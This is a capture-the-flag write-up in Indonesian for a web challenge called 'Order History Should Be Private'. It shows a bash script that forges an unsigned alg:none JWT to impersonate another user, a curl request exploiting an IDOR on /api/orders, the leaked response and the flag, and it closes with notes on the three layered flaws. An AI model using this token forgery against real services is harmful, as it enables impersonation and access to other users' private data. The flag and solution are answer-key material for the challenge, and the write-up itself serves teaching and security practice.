---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "Order History Should Be Private"
flag: "bitflag{1d0r_1s_4_d4ng3r0us_g4m3}"
teknik: "JWT alg:none diterima + IDOR di GET /api/orders; filter status='completed' adalah pengalih, forge sebagai reviewer seed k7m3n"
sumber: "https://github.com/Abdelkad3r/RIFFHACK/tree/main/07-web7-orders-jwt-idor"
---

# Order History Should Be Private — RIFFHACK 2026 (Web)

## Deskripsi Singkat

`GET /api/orders` mengembalikan order "milikmu", di mana "kamu" adalah id yang diklaim JWT `auth-token`. Verifier-nya menerima `alg:none`. Token palsu yang mengklaim jadi orang lain mengembalikan order orang itu. Jebakannya: endpoint ini juga memfilter `status = 'completed'`, jadi userId yang jelas (`ops-hidden`, `lookup-public`) mengembalikan kosong. Target sungguhannya ada di tabel lain.

## Analisis

Konfirmasi `alg:none` diterima. Coba userId yang jelas dari dump SQLi web3 (`lookup-public`, `ops-hidden`) — hasilnya kosong bukan karena IDOR tidak jalan, tapi karena order mereka berstatus `hidden`, `escrow-hold`, `released` — tidak ada yang `completed`. Filter status-nya memakan setiap baris.

**Pivot lewat tabel Review.** Reviewer seed memiliki order completed yang bisa dibaca IDOR-nya: tiga reviewer seed `xyz78`, `k7m3n`, `abc12`. Hanya `k7m3n` yang memiliki order dengan flag di `notes`.

## Eksploitasi / Solusi

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"id":"k7m3n","email":"k@x","isVendor":false,"iat":1,"exp":1782503527}' \
          | base64 | tr '+/' '-_' | tr -d '=')
curl -s -b "auth-token=${HEADER}.${PAYLOAD}." http://159.89.230.27/api/orders
```

```json
{"orders":[{
  "id":"order-admin-001","userId":"k7m3n",
  "listingId":"macro-builder","status":"completed",
  "notes":"bitflag{1d0r_1s_4_d4ng3r0us_g4m3}"
}],"userId":"k7m3n"}
```

## Catatan / Insight

Tiga kegagalan yang bertumpuk: `alg:none` diterima, tidak ada otorisasi terpisah dari autentikasi (handler mempercayai `decoded.id` sebagai pemilik resource tanpa memeriksa bahwa requester adalah user itu), dan filter status-only dipakai seolah-olah itu penjaga privasi. Setiap layer harus dipatahkan sendiri-sendiri untuk menutup bug-nya; masing-masing trivial diperbaiki sendiri-sendiri.

## Flag

```
bitflag{1d0r_1s_4_d4ng3r0us_g4m3}
```
